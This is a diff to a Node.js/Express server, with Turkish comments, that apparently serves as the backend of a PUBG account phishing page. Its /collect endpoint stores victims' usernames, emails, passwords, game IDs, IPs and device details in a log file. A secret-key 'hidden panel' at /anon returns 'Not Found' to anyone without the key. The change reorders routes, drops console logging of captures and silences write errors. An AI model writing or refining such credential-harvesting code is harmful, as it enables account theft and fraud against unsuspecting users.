@@ -10,46 +10,11 @@ const LOG_FILE = path.join(__dirname, "captures.jsonl");
 app.set("trust proxy", true);
 app.use(express.json({ limit: "1mb" }));
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, "public")));
-
-/* ---------- capture endpoint ---------- */
-app.post("/collect", (req, res) => {
-  const ip =
-    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
-    req.socket.remoteAddress ||
-    "?";
-
-  const record = {
-    ts:       new Date().toISOString(),
-    ip:       ip,
-    pubgid:   (req.body.pubgid || "").toString().slice(0, 64),
-    username: (req.body.username || "").toString().slice(0, 128),
-    email:    (req.body.email || "").toString().slice(0, 256),
-    password: (req.body.password || "").toString().slice(0, 256),
-    device:   req.body.device || {},
-    page:     (req.body.page || "").toString().slice(0, 512),
-    ua:       req.headers["user-agent"] || "",
-    ref:      req.headers["referer"] || ""
-  };
-
-  try {
-    fs.appendFileSync(LOG_FILE, JSON.stringify(record) + "\n");
-    console.log("[capture]", record.ts, record.ip, record.pubgid);
-  } catch (e) {
-    console.error("write error:", e.message);
-  }
-
-  res.json({ ok: true });
-});
 
 /* ---------- gizli panel ---------- */
-function keyOk(req) {
-  const candidate = req.query.k || req.headers["x-key"] || "";
-  return candidate === KEY;
-}
-
 app.get("/anon", (req, res) => {
-  if (!keyOk(req)) return res.status(404).send("Not Found");
+  const k = req.query.k || req.headers["x-key"] || "";
+  if (k !== KEY) return res.status(404).send("Not Found");
 
   let lines = [];
   try {
@@ -107,11 +72,41 @@ tr:hover td{background:#141820}
 </body></html>`);
 });
 
+/* ---------- capture endpoint ---------- */
+app.post("/collect", (req, res) => {
+  const ip =
+    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
+    req.socket.remoteAddress ||
+    "?";
+
+  const record = {
+    ts:       new Date().toISOString(),
+    ip:       ip,
+    pubgid:   (req.body.pubgid || "").toString().slice(0, 64),
+    username: (req.body.username || "").toString().slice(0, 128),
+    email:    (req.body.email || "").toString().slice(0, 256),
+    password: (req.body.password || "").toString().slice(0, 256),
+    device:   req.body.device || {},
+    page:     (req.body.page || "").toString().slice(0, 512),
+    ua:       req.headers["user-agent"] || "",
+    ref:      req.headers["referer"] || ""
+  };
+
+  try {
+    fs.appendFileSync(LOG_FILE, JSON.stringify(record) + "\n");
+  } catch (e) {}
+
+  res.json({ ok: true });
+});
+
 function esc(s) {
   return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({
     "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
   }[c]));
 }
+
+/* ---------- statik dosyalar (en sonda) ---------- */
+app.use(express.static(path.join(__dirname, "public")));
 
 app.listen(PORT, () => {
   console.log("listening on " + PORT);
